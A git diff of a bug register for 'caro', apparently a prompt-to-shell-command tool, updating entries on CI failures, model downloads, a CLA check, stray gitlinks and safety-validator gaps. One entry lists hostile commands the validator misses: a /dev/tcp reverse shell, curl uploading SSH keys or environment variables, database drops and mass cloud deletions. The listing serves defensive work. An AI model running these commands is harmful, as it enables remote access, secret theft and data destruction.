@@ -32,14 +32,15 @@ search overlay first opens (`website/src/components/OmniSearch.astro`).
 
 **Found:** 2026-09-27, PR #1470 session
 **Issue:** canonical #1098 (oldest open); 41 duplicates closed 2026-10-03; dups #1520, #1541 closed 2026-10-09
-**Status:** claimed-by integrator/20260903 (#1432). #1478 carries an overlapping
-fix; both are open and unmerged.
+**Status:** fix in #1478: `CLAUDE.md` points at `Cargo.toml` and repeats no
+version, and the PR closes #1098. #1432 was closed as superseded on 2026-10-09.
 **Needs human?:** no
-**Next step:** merge one of #1432 / #1478.
+**Next step:** merge #1478.
 Root cause: the daily QA routine (`trig_01Tk7DxyXV7LeYcFjgmTG1mZ`, 14:00 UTC)
 re-files instead of commenting on the existing issue. A "search before filing"
 edit was drafted 2026-10-03; only the maintainer can apply it (the routine was
-created via the API, so agents cannot update it).
+created via the API, so agents cannot update it). #1546 adds the
+search-before-filing step to the runner contract (CONTRACT.md section 6).
 
 ### BW-003: stale harness references (caro-eval, current-tasks.md, AGENTS.md, .kittify, --skill)
 
@@ -142,15 +143,15 @@ progress. Keep #1272 open until first-run download progress (or a clear
 
 **Found:** 2026-09-30 sweep, CI run 36658876598
 **Issue:** #1341
-**Status:** open. Root-caused 2026-10-09 (nightly run 37873894155). Two causes, 9 of 29 e2e tests fail in each job:
+**Status:** claimed-by sweep/2026-10-10-BW-015 (#1553). Root-caused 2026-10-09 (nightly run 37873894155). Two causes, 9 of 29 e2e tests fail in each job:
 (1) SmolLM 135M and StarCoder 1B: their `src/model_catalog.rs` repos (`HuggingFaceTB/SmolLM-135M-Instruct-GGUF`,
 `TheBloke/starcoderbase-1b-GGUF`) no longer exist on Hugging Face (anonymous API returns 401), so every download fails.
 PR smoke tests stay green only because the model cache restores an old file. The download error text also tells
 users to `export CARO_MODEL=smollm-135m-q4`, which cannot download.
 (2) Qwen 0.5B and TinyLlama 1.1B download, then abort in llama.cpp Metal: `GGML_ASSERT ggml-metal.m:870 "unsupported op"`
 (`llama_cpp = "0.3"`, `n_gpu_layers: 99` in `src/backends/embedded/mlx.rs`).
-**Needs human?:** yes. (1) Pick replacement repos (for example `HuggingFaceTB/smollm-135M-instruct-v0.2-Q8_0-GGUF`, which bundle.yml uses), or drop the models. (2) Bump llama_cpp, or run CI with CPU layers only.
-**Next step:** maintainer picks both options on #1341.
+**Needs human?:** no (decided 2026-10-10: SmolLM uses the bundle.yml Q8_0 repo, StarCoder is dropped, CI runs on CPU only).
+**Next step:** merge #1553, then confirm the next nightly Extended Tests run is green and close #1341.
 
 ### BW-016: 1.5.0 declared in-repo but never tagged or published
 
@@ -204,9 +205,9 @@ users to `export CARO_MODEL=smollm-135m-q4`, which cannot download.
 
 **Found:** 2026-10-03 sweep dedup
 **Issue:** #1162 (dup #1170)
-**Status:** claimed-by sweep/2026-10-09-BW-022 (#1548). The `evaluation` harness (`harness = false`) now accepts libtest's positional filter and skips itself when the filter does not match its name.
+**Status:** fixed (#1548, merged 2026-10-10). The `evaluation` harness (`harness = false`) now accepts libtest's positional filter and skips itself when the filter does not match its name.
 **Needs human?:** no
-**Next step:** merge the PR.
+**Next step:** none. Delete after 2026-10-17.
 
 ### BW-023: global flags before a subcommand swallow the subcommand
 
@@ -248,7 +249,36 @@ users to `export CARO_MODEL=smollm-135m-q4`, which cannot download.
 **Needs human?:** yes (safety patterns are a security-policy decision; not applied from a feature branch)
 **Next step:** `SafetyConfig::moderate()` returns `Safe` for `bash -i >& /dev/tcp/…`, `curl -F "key=@$HOME/.ssh/id_rsa" …`, `env | curl --data-binary @- …`, `sudo setenforce 0`, a uid-0 `useradd`, `mysql -e 'DROP DATABASE …'`, `redis-cli FLUSHALL`, `aws s3 rm --recursive`, `kubectl delete namespace`, `aws ec2 terminate-instances`, and `sudo truncate -s 0 /var/log/*.log`, while `rm -rf ./target` is `Critical`. The 121-row candidate file (`docs/ml/risk-gold-candidates.jsonl`) and its companion static-tier file (`docs/ml/risk-gold-static-tiers.jsonl`, joined on `id`) record each command and its static verdict; decide which gaps become patterns. BW-026 is reserved by #1507 (Validate Translations).
 
-### BW-042: hybrid sanitizer leaks spaced paths and inline credentials
+### BW-028: the CLA check never records a signature, so every external PR stays red
+
+**Found:** 2026-10-10, preparing first responses to external PRs (harness-plan session)
+**Issue:** #1555
+**Status:** open
+**Needs human?:** yes (a CI gate in `.github/workflows/cla.yml`, and part of the legal process)
+**Next step:** rename `custom-pr-sign-comment` to `custom-notsigned-prcomment` and set
+the one-line sign phrase, as #1555 shows. Then ask #1296, #1390 and #1415 to comment
+`recheck`.
+
+### BW-029: an unquoted prompt that starts with "list" runs the `list` subcommand
+
+**Found:** 2026-10-10, nightly CI triage (harness-plan session)
+**Issue:** #1550
+**Status:** open
+**Needs human?:** yes (CLI design: subcommands win, prompt fallback, or reserved names)
+**Next step:** the maintainer picks an option in #1550. Until then,
+`e2e_smoke_test_suite` and `e2e_shell_operator_truncation` fail in all 4
+Extended Tests jobs; BW-015 hides them, because most tests fail on the model first.
+
+### BW-030: 8 stray `.worktrees/*` gitlinks on main, no `.gitmodules`
+
+**Found:** 2026-10-10, nightly CI triage (harness-plan session)
+**Issue:** #1551
+**Status:** open
+**Needs human?:** no
+**Next step:** `git rm --cached` the 8 paths listed in #1551 (all added by
+`9599ca7`). `.gitignore` already covers `.worktrees/`.
+
+### BW-048: hybrid sanitizer leaks spaced paths and inline credentials
 
 **Found:** 2026-10-03 (cubic review on #1513)
 **Issue:** #1518. `PATH_RE` stops at whitespace, and there's no rule for `Authorization: Bearer`, `-u user:pass` or URL userinfo in the request input sent to hybrid remotes.
@@ -268,9 +298,9 @@ users to `export CARO_MODEL=smollm-135m-q4`, which cannot download.
 
 **Found:** 2026-10-09 sweep register sync (issue filed 2026-09-06)
 **Issue:** #1440
-**Status:** open (#1441, #1531, #1538 mention it)
+**Status:** claimed-by sweep/2026-10-10-BW-032 (#1561). The real path is `ModelLoader` → hf-hub 0.5, whose own client has no timeout (not `HfHubClient`). A progress watchdog fails an attempt after 60 s with no bytes. Each attempt runs on its own runtime, so a stalled attempt's hf-hub chunk tasks are cancelled before the retry. All errors keep the 3-attempt retry, which ends with a clear error.
 **Needs human?:** no
-**Next step:** set a connect and read timeout on the download client, and return a clear error when it fires.
+**Next step:** merge #1561, then close #1440.
 
 ### BW-033: Gemini CLI row in integrations status is stale (product shut down 2026-06-18)
 
@@ -332,9 +362,57 @@ users to `export CARO_MODEL=smollm-135m-q4`, which cannot download.
 
 **Found:** 2026-10-03 (while fixing "search for TODO in all python files")
 **Issue:** #1516. `search for <X> in python files` returns `find . -name "*.py" -type f` for any X other than TODO.
-**Status:** fixed (#1517: content-search handler in `StaticMatcher::content_search_command`)
+**Status:** fixed (#1517, merged 2026-10-10: content-search handler in `StaticMatcher::content_search_command`)
 **Needs human?:** no
-**Next step:** delete this entry a week after #1517 merges.
+**Next step:** none. Delete after 2026-10-17.
+
+### BW-042: an unquoted prompt that starts with "list" runs the `list` subcommand
+
+**Found:** 2026-10-10 sweep register sync (issue filed 2026-10-10, from nightly run 38016340315)
+**Issue:** #1550. `caro list files` fails with `unexpected argument 'files'`; 2 e2e tests fail in every Extended Tests job.
+**Status:** open
+**Needs human?:** yes (CLI design: how a prompt and a subcommand name share the first word)
+**Next step:** maintainer picks the parsing rule in #1550; then fix `src/main.rs` routing.
+
+### BW-043: 8 stray `.worktrees/*` gitlinks on main with no `.gitmodules`
+
+**Found:** 2026-10-10 sweep register sync (issue filed 2026-10-10)
+**Issue:** #1551. Commit `9599ca7` added 8 local worktree dirs as mode-160000 gitlinks.
+**Status:** open
+**Needs human?:** no
+**Next step:** `git rm --cached` the 8 gitlinks and confirm `.worktrees/` is in `.gitignore`.
+
+### BW-044: CLA check never records a signature, so every external PR stays red
+
+**Found:** 2026-10-10 sweep register sync (issue filed 2026-10-10)
+**Issue:** #1555. `custom-pr-sign-comment` in `.github/workflows/cla.yml` holds the whole notice, not the sign phrase. Blocks #1296, #1390, #1415.
+**Status:** open
+**Needs human?:** yes (CI gate / contributor policy)
+**Next step:** maintainer approves the 2-line `cla.yml` change proposed in #1555.
+
+### BW-045: `caro run` runbook path and step path keep shell state differently
+
+**Found:** 2026-10-10 sweep register sync (issue filed 2026-10-10)
+**Issue:** #1557. The runbook runs all steps in one `bash`; the step path uses a fresh shell per step.
+**Status:** open
+**Needs human?:** yes (product: which behavior is the contract)
+**Next step:** maintainer picks an option in #1557; recommended option 1 (subshell per step in the runbook).
+
+### BW-046: static safety validator rates reverse shells, exfiltration and DROP DATABASE as Safe
+
+**Found:** 2026-10-10 sweep register sync (issue filed 2026-10-10)
+**Issue:** #1559
+**Status:** open
+**Needs human?:** yes (safety patterns)
+**Next step:** maintainer approves the pattern set; then add patterns with the `safety-pattern-developer` TDD flow.
+
+### BW-047: upgrade reqwest 0.11 → 0.12 to clear h2 RUSTSEC-2026-0258 (wiremock is already 0.6.4)
+
+**Found:** 2026-10-10 sweep register sync (issue filed 2026-09-24)
+**Issue:** #1472 (related: #1446, the vulnerability report)
+**Status:** open
+**Needs human?:** yes (dependency major-version bump)
+**Next step:** maintainer approves the bump; note that hf-hub 0.5 already pulls reqwest 0.12.
 
 ---
 
